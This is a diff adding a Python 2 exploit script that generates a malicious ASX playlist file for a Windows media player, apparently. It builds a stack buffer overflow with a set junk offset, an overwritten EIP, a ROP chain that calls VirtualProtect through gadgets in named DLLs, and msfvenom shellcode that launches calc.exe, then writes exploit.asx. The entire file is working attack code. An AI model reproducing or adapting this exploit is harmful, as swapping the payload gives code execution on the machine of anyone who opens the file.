@@ -1,0 +1,83 @@
+import struct,sys
+head ='''<ASX version="3.0">
+<Entry>
+<REF HREF="mms://site.com/ach/music/smpl/LACA-05928-002-tes_'''
+
+#offset 17375
+junk = "A" *17375
+
+#0x1003df8e
+#0x774e1035
+EIP="\x36\x10\x4e\x77"
+
+adjust="A" *4
+
+def create_rop_chain():
+    
+    rop_gadgets = [
+      0x73dd5dce,  # POP EAX # RETN [MFC42.DLL] 
+      0x5d091368,  # ptr to &VirtualProtect() [IAT COMCTL32.dll]
+      0x7608708e,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSVCP60.dll] 
+      0x73dd40f1,  # XCHG EAX,ESI # RETN [MFC42.DLL] 
+      0x7c96feb7,  # POP EBP # RETN [ntdll.dll] 
+      0x7608fcec,  # & push esp # ret  [MSVCP60.dll]
+      0x01c395d4,  # POP EAX # RETN [MSA2Mcodec00.dll] 
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x77d74960,  # NEG EAX # RETN [USER32.dll] 
+      0x7ca485b4,  # XCHG EAX,EBX # RETN [SHELL32.dll] 
+      0x01d64827,  # POP EAX # RETN [msvos.dll] 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x77d74960,  # NEG EAX # RETN [USER32.dll] 
+      0x71ab9b46,  # XCHG EAX,EDX # RETN [WS2_32.dll] 
+      0x1003fd11,  # POP ECX # RETN [MSA2Mfilter03.dll] 
+      0x77da1d04,  # &Writable location [USER32.dll]
+      0x01d34691,  # POP EDI # RETN [MSA2Mctn01.dll] 
+      0x76091182,  # RETN (ROP NOP) [MSVCP60.dll]
+      0x7d7da123,  # POP EAX # RETN [WMVCore.DLL] 
+      0x90909090,  # nop
+      0x77195015,  # PUSHAD # RETN [OLEAUT32.dll] 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+	
+rop_chain = create_rop_chain()
+
+#msfvenom -a x86 --platform Windows -p windows/exec cmd=calc.exe -f python -b "\x00\x0a\x0d EXITFUNC=seh
+#badcharacters "\x00\x0a\x0d"
+
+buf =  ""
+buf += "\xda\xd6\xba\xf5\xa4\x32\xf4\xd9\x74\x24\xf4\x5d\x31"
+buf += "\xc9\xb1\x31\x83\xc5\x04\x31\x55\x14\x03\x55\xe1\x46"
+buf += "\xc7\x08\xe1\x05\x28\xf1\xf1\x69\xa0\x14\xc0\xa9\xd6"
+buf += "\x5d\x72\x1a\x9c\x30\x7e\xd1\xf0\xa0\xf5\x97\xdc\xc7"
+buf += "\xbe\x12\x3b\xe9\x3f\x0e\x7f\x68\xc3\x4d\xac\x4a\xfa"
+buf += "\x9d\xa1\x8b\x3b\xc3\x48\xd9\x94\x8f\xff\xce\x91\xda"
+buf += "\xc3\x65\xe9\xcb\x43\x99\xb9\xea\x62\x0c\xb2\xb4\xa4"
+buf += "\xae\x17\xcd\xec\xa8\x74\xe8\xa7\x43\x4e\x86\x39\x82"
+buf += "\x9f\x67\x95\xeb\x10\x9a\xe7\x2c\x96\x45\x92\x44\xe5"
+buf += "\xf8\xa5\x92\x94\x26\x23\x01\x3e\xac\x93\xed\xbf\x61"
+buf += "\x45\x65\xb3\xce\x01\x21\xd7\xd1\xc6\x59\xe3\x5a\xe9"
+buf += "\x8d\x62\x18\xce\x09\x2f\xfa\x6f\x0b\x95\xad\x90\x4b"
+buf += "\x76\x11\x35\x07\x9a\x46\x44\x4a\xf0\x99\xda\xf0\xb6"
+buf += "\x9a\xe4\xfa\xe6\xf2\xd5\x71\x69\x84\xe9\x53\xce\x74"
+buf += "\x1b\x6e\xda\xe1\x82\x1b\xa7\x6f\x35\xf6\xeb\x89\xb6"
+buf += "\xf3\x93\x6d\xa6\x71\x96\x2a\x60\x69\xea\x23\x05\x8d"
+buf += "\x59\x43\x0c\xee\x3c\xd7\xcc\xdf\xdb\x5f\x76\x20"
+
+shellcode="S"*10+buf
+
+print "Length of shellcode is:",len(shellcode)
+print "Length of ropchain is:",len(rop_chain)
+
+print"Calculating Garbage:",(26000-17375-4-4-len(shellcode)-len(rop_chain))
+
+garbage= "C" *8303
+
+foot ='''_playlis.wma"/>
+</Entry>
+</ASX>'''
+
+payload=head+junk+EIP+adjust+rop_chain+shellcode+garbage+foot
+
+fobj = open("exploit.asx","w")
+fobj.write(payload)
+fobj.close()
